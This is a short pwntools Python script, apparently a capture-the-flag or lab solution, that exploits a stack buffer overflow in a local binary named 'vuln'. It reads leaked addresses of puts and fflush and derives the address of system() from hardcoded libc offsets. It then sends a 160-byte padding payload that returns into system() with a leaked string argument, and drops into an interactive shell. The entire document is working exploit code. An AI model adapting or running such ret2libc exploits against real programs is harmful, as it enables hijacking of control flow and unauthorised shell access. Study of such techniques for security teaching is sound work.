#!/usr/bin/python
from pwn import *

puts_libc = 0x00067e30
fflush_libc = 0x00065fd0
system_libc = 0x0003d7e0

def main():
    p = process('./vuln')

    # Gather addresses
    p.recvuntil("puts: ")
    puts_addr = int(p.recvline(), 16)

    p.recvuntil("fflush ")
    fflush_addr = int(p.recvline(), 16)

    p.recvuntil("useful_string: ")
    useful_string_addr = int(p.recvline(), 16)

    print "puts", hex(puts_addr)
    print "fflush_addr", hex(fflush_addr)
    print "useful_string_addr", hex(useful_string_addr)

    # Check offset is correct
    puts_fflush_offset = (puts_libc - fflush_libc)
    assert (puts_addr - fflush_addr) == puts_fflush_offset

    # Calculate system() address
    puts_system_offset = (puts_libc - system_libc)
    system_addr = puts_addr - puts_system_offset

    # Calculate main() address
    # main_addr = useful_string_addr - 0x2030 + 0x803

    # Form payload
    payload = 'A' * 160
    # payload += p32(main_addr)
    payload += p32(system_addr)
    payload += "junk"
    payload += p32(useful_string_addr)

    p.recvuntil("Enter a string:")
    p.sendline(payload)

    # End off
    p.interactive()

    # Print core details
    core = p.corefile
    print 'EIP', hex(core.eip)


if __name__ == "__main__":
    main()
